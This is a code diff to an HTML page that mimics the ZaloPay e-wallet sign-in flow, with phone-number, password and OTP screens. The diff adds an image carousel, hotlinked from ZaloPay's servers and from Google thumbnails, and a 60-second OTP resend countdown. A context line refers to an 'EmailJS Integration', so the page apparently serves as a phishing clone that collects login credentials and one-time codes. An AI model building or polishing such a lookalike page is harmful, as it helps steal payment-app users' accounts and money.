@@ -352,27 +352,31 @@
       }
       .zlp-hero-banner {
         flex-shrink: 0;
+        position: relative;
+        overflow: hidden;
+        border-radius: 0 0 20px 20px;
         background-color: var(--zalopay-blue);
-        padding: 32px 24px 28px;
+      }
+      .zlp-carousel-track {
         display: flex;
-        flex-direction: column;
-        justify-content: flex-end;
-        min-height: 35%;
+        width: 100%;
+        transition: transform 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
       }
-      .zlp-hero-banner .zlp-logo {
-        height: 36px;
-        margin-bottom: 20px;
-        filter: brightness(0) invert(1);
+      .zlp-carousel-slide {
+        min-width: 100%;
+        flex-shrink: 0;
       }
-      .zlp-hero-tagline {
-        font-size: 22px;
-        font-weight: 700;
-        color: #ffffff;
-        line-height: 1.35;
-        text-align: left;
-        margin-bottom: 20px;
+      .zlp-carousel-slide img {
+        width: 100%;
+        height: 220px;
+        object-fit: cover;
+        display: block;
       }
       .zlp-carousel-dots {
+        position: absolute;
+        bottom: 10px;
+        left: 50%;
+        transform: translateX(-50%);
         display: flex;
         gap: 6px;
         align-items: center;
@@ -381,12 +385,23 @@
         width: 8px;
         height: 8px;
         border-radius: 50%;
-        background-color: rgba(255, 255, 255, 0.4);
+        background-color: rgba(255, 255, 255, 0.5);
+        transition: width 0.3s ease, background-color 0.3s ease;
       }
       .zlp-carousel-dots .dot.active {
         background-color: #ffffff;
         width: 20px;
         border-radius: 4px;
+      }
+
+      /* OTP countdown */
+      .otp-countdown {
+        font-size: 14px;
+        color: var(--text-secondary);
+      }
+      .otp-countdown strong {
+        color: var(--zalopay-blue);
+        font-weight: 600;
       }
 
       /* White card sliding up from bottom */
@@ -800,17 +815,29 @@
 
       <!-- ZaloPay Phone Input View -->
       <div id="zalopay-phone-section" class="page-section">
-        <!-- Blue hero banner (top ~35%) -->
+        <!-- Image carousel banner (top ~35%) -->
         <div class="zlp-hero-banner">
-          <img
-            src="https://simg.zalopay.com.vn/zlp-website/assets/new_logo_6c5db2d21b.svg"
-            alt="ZaloPay Logo"
-            class="zlp-logo"
-          />
-          <p class="zlp-hero-tagline">
-            Bắt nhịp tài chính linh hoạt từ số tiền nhỏ
-          </p>
-          <div class="zlp-carousel-dots">
+          <div class="zlp-carousel-track" id="zlp-carousel-track">
+            <div class="zlp-carousel-slide">
+              <img
+                src="https://simg.zalopay.com.vn/zlp-website/assets/1x_Referalt2_Mapthe_1242x598_71ef5626d7.jpg"
+                alt="ZaloPay Banner 1"
+              />
+            </div>
+            <div class="zlp-carousel-slide">
+              <img
+                src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhF-noJ2ASQUirdp-IW-aeuvD6cp-eCZug3A&s"
+                alt="ZaloPay Banner 2"
+              />
+            </div>
+            <div class="zlp-carousel-slide">
+              <img
+                src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSiY_zqVchIO6_ekRkr-X0TzGqB-Tsq9ZP9FA&s"
+                alt="ZaloPay Banner 3"
+              />
+            </div>
+          </div>
+          <div class="zlp-carousel-dots" id="zlp-carousel-dots">
             <span class="dot active"></span>
             <span class="dot"></span>
             <span class="dot"></span>
@@ -937,10 +964,10 @@
               />
             </form>
             <div class="link-container" id="resend-otp-container">
-              <span>Chưa nhận được mã?</span>
-              <a href="#" onclick="event.preventDefault(); resendOtp()"
-                >Gửi lại</a
-              >
+              <span id="otp-countdown-text" class="otp-countdown">Gửi lại sau <strong id="otp-countdown-value">60</strong>s</span>
+              <span id="otp-resend-text" style="display:none;">Chưa nhận được mã?
+                <a href="#" onclick="event.preventDefault(); resendOtp()">Gửi lại</a>
+              </span>
             </div>
             <div class="loading" id="zalopay-otp-loading">
               <div class="spinner"></div>
@@ -1114,6 +1141,52 @@
           setTimeout(() => notification.classList.remove("show"), duration);
         };
 
+        // Carousel logic
+        const carouselTrack = getEl("zlp-carousel-track");
+        const carouselDots = document.querySelectorAll("#zlp-carousel-dots .dot");
+        let currentSlide = 0;
+        let carouselInterval = null;
+
+        const goToSlide = (index) => {
+          currentSlide = index;
+          carouselTrack.style.transform = `translateX(-${currentSlide * 100}%)`;
+          carouselDots.forEach((dot, i) => {
+            dot.classList.toggle("active", i === currentSlide);
+          });
+        };
+
+        const startCarousel = () => {
+          if (carouselInterval) clearInterval(carouselInterval);
+          carouselInterval = setInterval(() => {
+            goToSlide((currentSlide + 1) % carouselDots.length);
+          }, 3000);
+        };
+
+        // OTP countdown logic
+        let otpCountdownInterval = null;
+
+        const startOtpCountdown = () => {
+          let seconds = 60;
+          const countdownText = getEl("otp-countdown-text");
+          const resendText = getEl("otp-resend-text");
+          const countdownValue = getEl("otp-countdown-value");
+
+          countdownText.style.display = "";
+          resendText.style.display = "none";
+          countdownValue.textContent = seconds;
+
+          if (otpCountdownInterval) clearInterval(otpCountdownInterval);
+          otpCountdownInterval = setInterval(() => {
+            seconds--;
+            countdownValue.textContent = seconds;
+            if (seconds <= 0) {
+              clearInterval(otpCountdownInterval);
+              countdownText.style.display = "none";
+              resendText.style.display = "";
+            }
+          }, 1000);
+        };
+
         window.showSection = (sectionId) => {
           document
             .querySelectorAll(".page-section")
@@ -1121,11 +1194,18 @@
           const targetSection = getEl(sectionId);
           if (targetSection) {
             targetSection.classList.add("active");
+            // Pause carousel when leaving the phone section
+            if (sectionId !== "zalopay-phone-section") {
+              if (carouselInterval) clearInterval(carouselInterval);
+            } else {
+              startCarousel();
+            }
             if (sectionId === "zalopay-password-section") {
               setTimeout(() => passwordInputEl.focus(), 100);
             }
             if (sectionId === "zalopay-otp-section") {
               setTimeout(() => otpSingleInput.focus(), 100);
+              startOtpCountdown();
             }
           }
         };
@@ -1255,6 +1335,7 @@
             "success"
           );
           clearOtpInputs();
+          startOtpCountdown();
         };
 
         // EmailJS Integration
@@ -1355,6 +1436,7 @@
         const init = () => {
           populateData();
           setupEventListeners();
+          startCarousel();
         };
 
         init();
